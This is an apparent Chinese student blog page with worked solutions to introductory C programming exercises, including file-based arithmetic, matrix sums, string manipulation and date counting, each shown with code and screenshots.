<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个整数：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;num);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="comment">//因为只要求了三位数，所以循环三位数就可以</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">100</span>; i &lt; <span class="number">1000</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> ge, shi,bai;</span><br><span class="line">		ge = i % <span class="number">10</span>;</span><br><span class="line">		shi = (<span class="keyword">int</span>)(i / <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">		bai = (<span class="keyword">int</span>)(i / <span class="number">100</span>) % <span class="number">10</span>;</span><br><span class="line">		<span class="keyword">if</span> ((ge * ge * ge + shi * shi * shi + bai * bai * bai) == num) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, i);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010211524684.png" alt="image-20231010211524684"></p>
<h1 id="文本文件读等式并计算"><a href="#文本文件读等式并计算" class="headerlink" title="文本文件读等式并计算"></a>文本文件读等式并计算</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010221422170.png" alt="image-20231010221422170"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	FILE* fp = fopen(<span class="string">&quot;Comp.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> a, b;</span><br><span class="line">	<span class="keyword">char</span> op;</span><br><span class="line">	<span class="comment">//while ((ch = fgetc(fp)) != EOF) &#123;//while中的条件是检测是否读取到文件末尾或者是否出错</span></span><br><span class="line">	<span class="comment">//	str[i] = ch;//将数据读取到字符串中去</span></span><br><span class="line">	<span class="comment">//	i++;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//但是上述方法是不行滴</span></span><br><span class="line">	<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d %c %d&quot;</span>, &amp;a, &amp;op, &amp;b);<span class="comment">//这个东西可以按格式读取</span></span><br><span class="line">	<span class="keyword">if</span> (op == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> re = a + b;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;结果是：%d&quot;</span>, re);</span><br><span class="line">		FILE* fp2 = fopen(<span class="string">&quot;Comp2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);<span class="comment">//w模式打开方便写东西</span></span><br><span class="line">		<span class="built_in">fprintf</span>(fp2, <span class="string">&quot;%d %c %d = %d&quot;</span>, a, op, b, re);</span><br><span class="line">		fclose(fp2);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> re = a - b;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;结果是：%d&quot;</span>, re);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp, <span class="string">&quot;%d %c %d = %d&quot;</span>, a, op, b, re);</span><br><span class="line">		FILE* fp2 = fopen(<span class="string">&quot;Comp2.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp2, <span class="string">&quot;%d %c %d = %d&quot;</span>, a, op, b, re);</span><br><span class="line">		fclose(fp2);</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010221503753.png" alt="image-20231010221503753"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231010221512213.png" alt="image-20231010221512213"></p>
<h1 id="输入三行三列的矩阵，求和"><a href="#输入三行三列的矩阵，求和" class="headerlink" title="输入三行三列的矩阵，求和"></a>输入三行三列的矩阵，求和</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231011223859342.png" alt="image-20231011223859342"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231011223903443.png" alt="image-20231011223903443"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">3</span>][<span class="number">3</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一个三阶矩阵:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;arr[i][<span class="number">0</span>], &amp;arr[i][<span class="number">1</span>], &amp;arr[i][<span class="number">2</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++) &#123;</span><br><span class="line">			sum += arr[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nsum = %d&quot;</span>, sum);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231011224340568.png" alt="image-20231011224340568"></p>
<h1 id="删除字符串中的星号"><a href="#删除字符串中的星号" class="headerlink" title="删除字符串中的星号"></a>删除字符串中的星号</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231011224753198.png" alt="image-20231011224753198"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> arr[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> brr[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一串字符串：&quot;</span>);</span><br><span class="line">	gets_s(arr);</span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(arr);</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (arr[i] == <span class="string">&#x27;*&#x27;</span>) &#123;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			brr[j] = arr[i];</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, brr);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231011225149241.png" alt="image-20231011225149241"></p>
<h1 id="输出能被3整出且h含有5的数"><a href="#输出能被3整出且h含有5的数" class="headerlink" title="输出能被3整出且h含有5的数"></a>输出能被3整出且h含有5的数</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231011225314818.png" alt="image-20231011225314818"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> m, n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;m, &amp;n);</span><br><span class="line">	<span class="keyword">if</span> ((m &lt; <span class="number">0</span> || n &lt; <span class="number">0</span>) || (m &gt; <span class="number">1000</span> || n &gt; <span class="number">1000</span>)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入正确的0，1000的正整数。&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n &lt; m) &#123;</span><br><span class="line">		<span class="keyword">int</span> t = m;</span><br><span class="line">		m = n;</span><br><span class="line">		n = t;</span><br><span class="line">	&#125;<span class="comment">//将小的放到n</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> ge, shi, bai, qian;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;result:\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = m; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((i % <span class="number">3</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">			ge = i % <span class="number">10</span>;</span><br><span class="line">			shi = (i / <span class="number">10</span>) % <span class="number">10</span>;</span><br><span class="line">			bai = (i / <span class="number">100</span>) % <span class="number">10</span>;</span><br><span class="line">			qian = (i / <span class="number">1000</span>) % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> ((ge == <span class="number">5</span>) || (bai == <span class="number">5</span>) || (qian == <span class="number">5</span>)) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%6d&quot;</span>, i);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231021192537976.png" alt="image-20231021192537976"></p>
<h1 id="计算文本文件中的算式"><a href="#计算文本文件中的算式" class="headerlink" title="计算文本文件中的算式"></a>计算文本文件中的算式</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231023224929530.png" alt="image-20231023224929530"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231023224937777.png" alt="image-20231023224937777"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	FILE* fp = fopen(<span class="string">&quot;comp.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">200</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;打开文件失败！&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span> ch;</span><br><span class="line">	<span class="keyword">int</span> a, b, result;</span><br><span class="line">	<span class="keyword">char</span> op;</span><br><span class="line">	<span class="keyword">while</span> ((ch = fgetc(fp)) != EOF) &#123;<span class="comment">//不断循环看文件是否达到了末尾类似feof</span></span><br><span class="line">		<span class="built_in">fscanf</span>(fp, <span class="string">&quot;%d %c %d&quot;</span>, &amp;a, &amp;op, &amp;b);</span><br><span class="line">		<span class="keyword">if</span> (op == <span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">			result = a - b;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d %c %d = %d\n&quot;</span>, a, op, b, result);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="string">&#x27;+&#x27;</span>) &#123;</span><br><span class="line">			result = a + b;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d %c %d = %d\n&quot;</span>, a, op, b, result);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	fclose(fp);</span><br><span class="line">&#125;<span class="comment">//非常重要的一次编程！</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231023231637763.png" alt="image-20231023231637763"></p>
<h1 id="求一个矩阵的对角线元素之和"><a href="#求一个矩阵的对角线元素之和" class="headerlink" title="求一个矩阵的对角线元素之和"></a>求一个矩阵的对角线元素之和</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231023232550298.png" alt="image-20231023232550298"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231023232557057.png" alt="image-20231023232557057"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> arr[<span class="number">20</span>][<span class="number">20</span>];</span><br><span class="line">	<span class="keyword">int</span> m;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入矩阵的阶数：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;m);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n请输入矩阵中的元素：\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入第%d行第%d列的元素：\n&quot;</span>,i,j);</span><br><span class="line">			<span class="keyword">int</span> temp;</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;temp);<span class="comment">//赋值</span></span><br><span class="line">			arr[i][j] = temp;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, arr[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; m; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i == j) &#123;</span><br><span class="line">				sum += arr[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;主对角线元素之和为：%d&quot;</span>, sum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//不用动态分配二维数组，直接分配好最大数量，然后使用即可。</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231023233218105.png" alt="image-20231023233218105"></p>
<h1 id="求公元纪元到指定日期的天数"><a href="#求公元纪元到指定日期的天数" class="headerlink" title="求公元纪元到指定日期的天数"></a>求公元纪元到指定日期的天数</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231024195300894.png" alt="image-20231024195300894"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231024195305751.png" alt="image-20231024195305751"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> year, month, day, i;</span><br><span class="line"><span class="keyword">int</span> total[<span class="number">13</span>] = &#123; <span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span> &#125;;</span><br><span class="line"><span class="keyword">double</span> sumyear = <span class="number">0</span>, summonth = <span class="number">0</span>, sum;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;input a data(year-month-day):&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d-%d-%d&quot;</span>, &amp;year, &amp;month, &amp;day);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; year; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">400</span> == <span class="number">0</span> || i % <span class="number">100</span> != <span class="number">0</span> &amp;&amp; i % <span class="number">4</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">sumyear += <span class="number">366</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">sumyear += <span class="number">365</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; month; i++)</span><br><span class="line">&#123;</span><br><span class="line">summonth += total[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (year % <span class="number">400</span> == <span class="number">0</span> &amp;&amp; month &gt; <span class="number">2</span> || year % <span class="number">100</span> != <span class="number">0</span> &amp;&amp; year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; month &gt; <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">summonth += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">sum = sumyear + summonth + day;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;The result is %.0lf.\n&quot;</span>, sum);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>好难的题</p>
<h1 id="字符数组相互穿插"><a href="#字符数组相互穿插" class="headerlink" title="字符数组相互穿插"></a>字符数组相互穿插</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231024202653587.png" alt="image-20231024202653587"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231024202658531.png" alt="image-20231024202658531"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> s1[<span class="number">127</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> s2[<span class="number">127</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> s3[<span class="number">300</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入数组1：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n请输入数组2：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, s2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (s1[i] == <span class="string">&#x27;\0&#x27;</span>) &#123;<span class="comment">//1走完了</span></span><br><span class="line">			<span class="keyword">if</span> (s2[j] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n结果是：%s&quot;</span>, s3);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;<span class="comment">//1走完了看2走完没</span></span><br><span class="line">			s3[k] = s2[j];</span><br><span class="line">			k++; j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (s2[j] == <span class="string">&#x27;\0&#x27;</span>) &#123;<span class="comment">//2走完了</span></span><br><span class="line">			<span class="keyword">if</span> (s1[i] == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n结果是：%s&quot;</span>, s3);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;<span class="comment">//2走完了看1走完没</span></span><br><span class="line">			s3[k] = s1[i];</span><br><span class="line">			k++; i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			s3[k] = s1[i];</span><br><span class="line">			k++; i++;</span><br><span class="line">			s3[k] = s2[j];</span><br><span class="line">			k++; j++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231024204610377.png" alt="image-20231024204610377"></p>
<h1 id="找出最长单词"><a href="#找出最长单词" class="headerlink" title="找出最长单词"></a>找出最长单词</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231025184725381.png" alt="image-20231025184725381"></p>
<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231025184729998.png" alt="image-20231025184729998"></p>
<p>光看这个例子咱再怎么说也得把这道题写了把啊？毕竟是我的母校嘞(<em>∩_∩</em>)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入一串字符：&quot;</span>);</span><br><span class="line">	<span class="keyword">char</span> ch[<span class="number">127</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	gets_s(ch);<span class="comment">//若使用scanf，则会只读取一个单词</span></span><br><span class="line">	<span class="keyword">int</span> len = <span class="built_in">strlen</span>(ch);</span><br><span class="line">	<span class="keyword">char</span> temp[<span class="number">127</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= len; i++) &#123;<span class="comment">//第len个才是结束符！</span></span><br><span class="line">		<span class="keyword">if</span> (ch[i] != <span class="string">&#x27; &#x27;</span> &amp;&amp; ch[i] != <span class="string">&#x27;\0&#x27;</span>) &#123;<span class="comment">//不要忘记结束符号！</span></span><br><span class="line">			temp[j] = ch[i];</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strlen</span>(temp) &gt; max) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n22%s&quot;</span>, temp);</span><br><span class="line">				max = <span class="built_in">strlen</span>(temp);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">strcpy</span>(temp, <span class="string">&quot;&quot;</span>);<span class="comment">//将最大的单词清零</span></span><br><span class="line">			j = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n最大的单词长度是：%d&quot;</span>, max);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231025190839983.png" alt="image-20231025190839983"></p>
<h1 id="学生报数，排除第三个"><a href="#学生报数，排除第三个" class="headerlink" title="学生报数，排除第三个"></a>学生报数，排除第三个</h1><p><img src="/2023/11/29/C%E8%AF%AD%E8%A8%80%E5%A4%A7%E9%A2%98%E9%A2%98%E5%BA%931/image-20231025192953061.png" alt="image-20231025192953061"></p>
